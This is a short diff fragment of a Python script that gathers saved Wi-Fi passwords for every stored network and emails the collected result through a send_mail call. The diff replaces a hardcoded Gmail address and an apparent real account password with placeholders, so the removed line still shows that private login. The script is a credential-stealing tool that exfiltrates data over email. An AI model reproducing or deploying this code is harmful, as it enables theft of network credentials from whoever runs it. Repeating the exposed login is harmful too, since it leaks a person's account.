@@ -29,4 +29,4 @@ for network_name in network_names_list:
 	
 	result = result + wifi_password
 
-send_mail("iwunduchinonso1@gmail.com", "mouau1221108", result)
+send_mail("your email", "your password", result)
